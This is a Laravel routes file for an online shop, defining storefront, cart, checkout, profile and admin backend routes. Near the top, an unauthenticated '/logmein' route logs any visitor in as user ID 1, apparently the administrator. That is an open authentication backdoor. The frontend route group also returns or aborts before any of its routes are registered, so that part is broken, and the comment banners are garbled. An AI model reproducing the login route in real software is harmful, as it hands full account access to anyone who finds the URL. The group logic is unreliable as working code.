<?php


use Illuminate\Support\Facades\Auth;


Route::auth();

Route::get('/logmein', function () {
    Auth::loginUsingId(1);
    return redirect('/');
});

//Auth::LoginUsingId(1);
/***************************************************************************************************
 * â–‚ â–ƒ â–… â–† â–ˆ Frontend  â–ˆ â–† â–… â–ƒ â–‚
 ***************************************************************************************************/
Route::group(['namespace' => 'Frontend'], function () {
    if(auth()->check()) {
        if(!request()->user()->can('isAdmin')) {
            return abort(501,'Under Maintenance.');
        }
        return true;
    } else {
        return abort(501,'Under Maintenance.');
    }
    Route::get('/success', ['uses' => 'CheckoutController@paymentSuccess']);
    Route::get('/error', ['uses' => 'CheckoutController@paymentFail']);

    Route::get('/invoice/{order}', ['uses' => 'CheckoutController@orderInvoice']);

    Route::get('/lang/{lang}', 'LanguageController@changeLocale');
    Route::get('/currency/{currencyCode}', ['as' => 'currency', 'uses' => 'CurrencyController@changeCurrency']);
    /***************************************************************************************************
     * â–‚ â–ƒ â–… â–† â–ˆ COMPANY ROUTES  â–ˆ â–† â–… â–ƒ â–‚
     ***************************************************************************************************/
    // return all the products for a specific company and all branches related to the current company
    Route::get('/', ['uses' => 'HomeController@index'])->name('home');// DONE
    Route::get('/home', ['as' => 'home', 'uses' => 'HomeController@index']);// DONE

    /***************************************************************************************************
     * â–‚ â–ƒ â–… â–† â–ˆ PRODUCT ROUTE â–ˆ â–† â–… â–ƒ â–‚
     ***************************************************************************************************/
    Route::get('product/search', ['as' => 'search', 'uses' => 'ProductController@searchItem']);
    Route::get('product', ['as' => 'product.index', 'uses' => 'ProductController@index']); // route filters
    Route::get('product/{productId}', ['as' => 'product.show', 'uses' => 'ProductController@show']); // DONE
    Route::get('products/tags/{tagName}', ['as' => 'product.tags', 'uses' => 'ProductController@getTaggedProducts']); // DONE
    // recommended products
    Route::get('products/recommendations', ['as' => 'product.recommendations', 'uses' => 'ProductController@getRecommendedProducts']);
    // colors from size
    Route::get('product/{productId}/{sizeId}', ['as' => 'product.filter.colors', 'uses' => 'ProductController@getDataFromSize']);
    Route::get('product-color/{productId}/{colorId}', ['as' => 'product.filter.sizes', 'uses' => 'ProductController@getDataFromColor']);
    /***************************************************************************************************
     * â–‚ â–ƒ â–… â–† â–ˆ CATEGORY PRODUCT ROUTE â–ˆ â–† â–… â–ƒ â–‚
     ***************************************************************************************************/
    Route::get('category/{parentId}', ['as' => 'category.show', 'uses' => 'CategoryController@show']); // DONE
//    Route::get('category/filter', ['as' => 'category.filter', 'uses' => 'CategoryController@filter']); // DONE

    /***************************************************************************************************
     * â–‚ â–ƒ â–… â–† â–ˆ CART ROUTES â–ˆ â–† â–… â–ƒ â–‚
     ***************************************************************************************************/
    Route::post('cart/update', ['as' => 'cart.update', 'uses' => 'CartController@updateCart']);
    Route::post('cart/clear', ['as' => 'cart.clear', 'uses' => 'CartController@clearCart']);
    Route::post('cart/add', ['as' => 'cart.add', 'uses' => 'CartController@addItem']);
    Route::get('cart/{id}/remove', ['as' => 'cart.remove', 'uses' => 'CartController@removeItem']);
//    Route::post('cart/checkout', 'CartController@checkout');
    Route::get('cart', ['as' => 'cart.index', 'uses' => 'CartController@index']);
    Route::post('cart/checkout', ['as' => 'cart.checkout', 'uses' => 'CheckoutController@index']);
    Route::post('checkout/review', ['as' => 'checkout.review', 'uses' => 'CheckoutController@reviewOrder']);
    Route::post('checkout', ['as' => 'checkout.index', 'uses' => 'CheckoutController@checkout']);

    /***************************************************************************************************
     * â–‚ â–ƒ â–… â–† â–ˆ GENERAL ROUTES THAT WE MANY NEED IN THE FUTURE FOR BOTH PROJECTS â–ˆ â–† â–… â–ƒ â–‚
     ***************************************************************************************************/
    Route::get('contact', ['as' => 'contact', 'uses' => 'PageController@getContact']); // DONE
    Route::post('contact', ['as' => 'contact', 'uses' => 'PageController@postContact']); // DONE
    Route::get('about', ['as' => 'about', 'uses' => 'PageController@getAboutus']); // DONE
    Route::get('/newsletter', ['as' => 'newsletter.index', 'uses' => 'NewsLetterController@index']);
    Route::post('/newsletter', ['as' => 'newsletter.store', 'uses' => 'NewsLetterController@store']);
    Route::get('faq', ['as' => 'faq', 'uses' => 'PageController@getFaq']); // DONE
    Route::get('privacy', ['as' => 'privacy', 'uses' => 'PageController@getPrivacy']); // DONE
    Route::get('terms', ['as' => 'terms', 'uses' => 'PageController@getTerms']); // DONE
    Route::get('policy', ['as' => 'policy', 'uses' => 'PageController@getPolicy']); // DONE
    Route::get('shipping-orders', ['as' => 'shipping-orders', 'uses' => 'PageController@getShippingOrders']); // DONE


    /***************************************************************************************************
     * â–‚ â–ƒ â–… â–† â–ˆ  FRONTEND AUTH ROUTES â–ˆ â–† â–… â–ƒ â–‚
     ***************************************************************************************************/
    Route::group(['middleware' => 'auth'], function () {
        Route::get('orders', ['as' => 'orders', 'uses' => 'ProfileController@getOrders']);
        Route::get('orders/{id}', ['as' => 'order.show', 'uses' => 'ProfileController@getOrderDetails']);
        Route::get('profile', ['as' => 'profile', 'uses' => 'ProfileController@index']);
        Route::get('profile/edit', ['as' => 'profile.edit', 'uses' => 'ProfileController@editProfile']);
        Route::post('profile/update', ['as' => 'profile.update', 'uses' => 'ProfileController@updateProfile']);
        Route::get('product/{id}/wishlist/add', ['as' => 'wishlist.add', 'uses' => 'WishListController@addProduct']); // DONE
        Route::get('product/{id}/wishlist/remove', ['as' => 'wishlist.remove', 'uses' => 'WishListController@removeProduct']); // DONE
        Route::resource('wishlist', 'WishListController', ['only' => ['index', 'store', 'destroy']]); // DONE
    });

    /***************************************************************************************************
     * â–‚ â–ƒ â–… â–† â–ˆ  AJAX ROUTES  â–ˆ â–† â–… â–ƒ â–‚
     ***************************************************************************************************/
    // RANGE route
//    Route::group(['prefix' => 'api'], function () {
//
//    });


    /***************************************************************************************************
     * â–‚ â–ƒ â–… â–† â–ˆ  FRONTEND _web_socket.js == PLEASE IGNORE IT â–ˆ â–† â–… â–ƒ â–‚
     ***************************************************************************************************/
//    Route::get('redis', function () {
//        event(new UserDidSth());
//        return view('redis');
//    });

});


/***************************************************************************************************
 * â–‚ â–ƒ â–… â–† â–ˆ BACKEND ROUTES â–ˆ â–† â–… â–ƒ â–‚
 ***************************************************************************************************/

Route::group(['namespace' => 'Backend', 'prefix' => 'backend', 'as' => 'backend.', 'middleware' => ['auth', 'AdminOnly']], function () {

    /***************************************************************************************************
     * â–‚ â–ƒ â–… â–† â–ˆ BACKEND ROUTES â–ˆ â–† â–… â–ƒ â–‚             ADMIN       OWNER       ASSISTANT
     ***************************************************************************************************/
    Route::get('/', ['as' => 'dashboard.index', 'uses' => 'DashBoardController@index']);
    Route::post('user/status/{id}', ['as' => 'user.suspend', 'uses' => 'UserController@suspendStatus']);
    Route::resource('user', 'UserController');
    Route::resource('product', 'ProductController');
    Route::resource('coupon', 'CouponController');
    Route::resource('meta', 'ProductMetaController');
    Route::resource('attribute', 'ProductAttributeController');
    Route::resource('gallery', 'GalleryController');
    Route::post('gallery/image', ['as' => 'gallery.image.delete', 'uses' => 'GalleryController@deleteImage']);
    Route::resource('image', 'ImageController');
    Route::resource('tag', 'TagController');
    Route::resource('category', 'CategoryController');
    Route::resource('subcategory', 'SubCategoryController');
    Route::resource('slider', 'SliderController');
    Route::resource('ad', 'AdController');
    Route::resource('order', 'OrderController', ['except' => ['destroy']]);
    Route::get('order/change/{id}/{status}', ['as' => 'order.status.change', 'uses' => 'OrderController@changeStatus']);
    Route::post('order/search', ['as' => 'order.search', 'uses' => 'OrderController@ordersBetweenDates']);
    Route::post('order/ship', ['as' => 'order.shipped', 'uses' => 'OrderController@addOrderTrackId']);
    Route::get('currency', ['as' => 'currency.index', 'uses' => 'CurrencyController@index']);
    Route::get('currency/update', ['as' => 'currency.update', 'uses' => 'CurrencyController@updateRates']);
    Route::get('backup/db', ['as' => 'backup.db', 'uses' => 'DashBoardController@BackupDB']);
    Route::get('newsletter/campaign', ['as' => 'newsletter.campaign', 'uses' => 'NewsLetterController@getCampaign']);
    Route::post('newsletter/campaign', ['as' => 'newsletter.campaign', 'uses' => 'NewsLetterController@postCampaign']);
    Route::resource('newsletter', 'NewsLetterController');
    Route::resource('color', 'ColorController', ['except' => 'destroy']);
    Route::resource('size', 'SizeController', ['except' => 'destroy']);
    Route::resource('chart', 'SizeChartController');

    //Static Pages
    Route::get('pages', ['uses' => 'PageController@getAboutUs']);
    Route::get('about', ['as' => 'pages.about.index', 'uses' => 'PageController@getAboutUs']);
    Route::post('about', ['as' => 'pages.about.update', 'uses' => 'PageController@postAboutUs']);
    Route::get('privacy', ['as' => 'pages.privacy.index', 'uses' => 'PageController@getPrivacy']);
    Route::post('privacy', ['as' => 'pages.privacy.update', 'uses' => 'PageController@postPrivacy']);
    Route::get('terms', ['as' => 'pages.terms.index', 'uses' => 'PageController@getTerms']);
    Route::post('terms', ['as' => 'pages.terms.update', 'uses' => 'PageController@postTerms']);
    Route::get('contact', ['as' => 'pages.contact.index', 'uses' => 'PageController@getContact']);
    Route::post('contact', ['as' => 'pages.contact.update', 'uses' => 'PageController@postContactInfo']);

    Route::get('faqs', ['as' => 'pages.faqs.index', 'uses' => 'StaticPagesQuestionsController@faqIndex']);
    Route::get('faqs/create', ['as' => 'pages.faqs.new', 'uses' => 'StaticPagesQuestionsController@createFaq']);
    Route::post('faqs/store', ['as' => 'pages.faqs.store', 'uses' => 'StaticPagesQuestionsController@storeFaq']);
    Route::get('faq/{faqId}', ['as' => 'pages.faqs.edit', 'uses' => 'StaticPagesQuestionsController@editFaq']);
    Route::post('faq/{faqId}/update', ['as' => 'pages.faqs.update', 'uses' => 'StaticPagesQuestionsController@update']);
    Route::post('faq/{faqId}/destroy', ['as' => 'pages.faqs.destroy', 'uses' => 'StaticPagesQuestionsController@destroy']);

    Route::get('return-policy', ['as' => 'pages.returnPolicy.index', 'uses' => 'StaticPagesQuestionsController@returnPolicyIndex']);
    Route::get('return-policy/create', ['as' => 'pages.returnPolicy.new', 'uses' => 'StaticPagesQuestionsController@createReturnPolicy']);
    Route::post('return-policy/store', ['as' => 'pages.returnPolicy.store', 'uses' => 'StaticPagesQuestionsController@storeReturnPolicy']);
    Route::get('return-policy/{policyId}', ['as' => 'pages.returnPolicy.edit', 'uses' => 'StaticPagesQuestionsController@editReturnPolicy']);
    Route::post('return-policy/{policyId}/update', ['as' => 'pages.returnPolicy.update', 'uses' => 'StaticPagesQuestionsController@update']);
    Route::post('return-policy/{policyId}/destroy', ['as' => 'pages.returnPolicy.destroy', 'uses' => 'StaticPagesQuestionsController@destroy']);

    Route::get('orders-policy', ['as' => 'pages.shippingOrders.index', 'uses' => 'StaticPagesQuestionsController@ordersShippingIndex']);
    Route::get('orders-policy/create', ['as' => 'pages.shippingOrders.new', 'uses' => 'StaticPagesQuestionsController@createOrdersShipping']);
    Route::post('orders-policy/store', ['as' => 'pages.shippingOrders.store', 'uses' => 'StaticPagesQuestionsController@storeOrdersShipping']);
    Route::get('orders-policy/{policyId}', ['as' => 'pages.shippingOrders.edit', 'uses' => 'StaticPagesQuestionsController@editOrdersShipping']);
    Route::post('orders-policy/{policyId}/update', ['as' => 'pages.shippingOrders.update', 'uses' => 'StaticPagesQuestionsController@update']);
    Route::post('orders-policy/{policyId}/destroy', ['as' => 'pages.shippingOrders.destroy', 'uses' => 'StaticPagesQuestionsController@destroy']);


}); // end of Meem Namespace












